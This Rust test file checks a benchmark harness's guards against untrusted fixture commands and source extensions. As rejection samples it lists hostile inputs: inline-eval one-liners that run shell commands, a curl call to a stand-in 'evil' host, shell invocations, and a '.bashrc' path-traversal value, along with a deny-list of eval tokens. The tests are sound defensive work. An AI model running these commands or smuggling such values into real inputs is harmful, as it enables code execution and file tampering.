//! Tests for the benchmark fixture execution guard (SEC-003) and the
//! fixture-supplied source-extension guard (SEC-004).
//!
//! `execution_commands` and `source_extension` are both untrusted corpus content
//! (a cloned repository, a downloaded dataset, `/bench init`), so they must not
//! be able to reach a process spawn or a path write unchecked.

use ragent_bench::exec_guard::{
    ALLOWED_FIXTURE_PROGRAMS, DENIED_FIXTURE_PROGRAM_ARGS, is_safe_source_extension,
    validate_fixture_command,
};

fn parts(values: &[&str]) -> Vec<String> {
    values.iter().map(|value| (*value).to_string()).collect()
}

/// SEC-003: the shipped harness commands still validate.
#[test]
fn shipped_harness_commands_validate() {
    for command in [
        parts(&["g++", "__FILENAME__", "-o", "./candidate.cpp.exe"]),
        parts(&["rustc", "--test", "__FILENAME__", "-o", "candidate"]),
        parts(&["node", "__FILENAME__"]),
        parts(&["javac", "__FILENAME__"]),
        parts(&["java", "Main"]),
        parts(&["go", "test", "."]),
        parts(&["tsc", "--outDir", "out", "__FILENAME__"]),
    ] {
        assert!(
            validate_fixture_command(&command).is_ok(),
            "shipped command should pass: {command:?}"
        );
    }
}

/// SEC-003: the inline-eval route is rejected - the defect was that only the
/// first argv token was validated.
#[test]
fn inline_eval_arguments_are_rejected() {
    for command in [
        parts(&["python3", "-c", "import os; os.system('id')"]),
        parts(&["python", "-c", "print(1)"]),
        parts(&["node", "-e", "require('child_process').execSync('id')"]),
        parts(&["node", "--eval=1+1"]),
        parts(&["ruby", "-r", "open-uri", "-e", "system('id')"]),
        parts(&["php", "-r", "system('id');"]),
        parts(&["go", "run", "payload.go"]),
        parts(&["python3", "-"]),
        parts(&["python3", "/dev/stdin"]),
    ] {
        let result = validate_fixture_command(&command);
        assert!(
            result.is_err(),
            "inline-eval command must be rejected: {command:?}"
        );
    }
}

/// SEC-003: a non-allowlisted program is still rejected (regression guard for
/// the original T-009 fix).
#[test]
fn non_allowlisted_programs_are_rejected() {
    for command in [
        parts(&["/bin/sh", "-c", "id"]),
        parts(&["sh", "-c", "id"]),
        parts(&["bash", "payload.sh"]),
        parts(&["env", "id"]),
        parts(&["curl", "http://evil/x"]),
        parts(&["../payload"]),
        parts(&["/usr/bin/python3", "x.py"]),
    ] {
        assert!(
            validate_fixture_command(&command).is_err(),
            "non-allowlisted program must be rejected: {command:?}"
        );
    }
    assert!(
        validate_fixture_command(&[]).is_err(),
        "an empty command list must be rejected"
    );
}

/// SEC-004: only a short alphanumeric identifier is a safe source extension.
#[test]
fn source_extension_is_identifier_shaped() {
    for ok in ["py", "cpp", "js", "rs", "ts", "py_1", "abcdefgh"] {
        assert!(
            is_safe_source_extension(ok),
            "'{ok}' should be an acceptable extension"
        );
    }
    for bad in [
        "",
        "../../../../home/user/.bashrc",
        "py/../../x",
        "py\\x",
        "py.rs",
        "abcdefghi",
        "py ",
        "py\0",
    ] {
        assert!(
            !is_safe_source_extension(bad),
            "'{bad}' should be rejected as an extension"
        );
    }
}

/// The allowlist and deny-list are the documented shapes: no shell interpreter
/// is an allowed program, and the deny-list covers the eval/stdin tokens.
#[test]
fn allowlist_excludes_shell_interpreters_and_denylist_covers_eval() {
    for shell in ["sh", "bash", "zsh", "env", "xargs", "timeout"] {
        assert!(
            !ALLOWED_FIXTURE_PROGRAMS.contains(&shell),
            "shell/wrapper program '{shell}' must not be allowlisted"
        );
    }
    for token in ["-c", "-e", "-r", "--eval", "-m", "run", "-", "/dev/stdin"] {
        assert!(
            DENIED_FIXTURE_PROGRAM_ARGS.contains(&token),
            "eval/stdin token '{token}' must be denied"
        );
    }
}
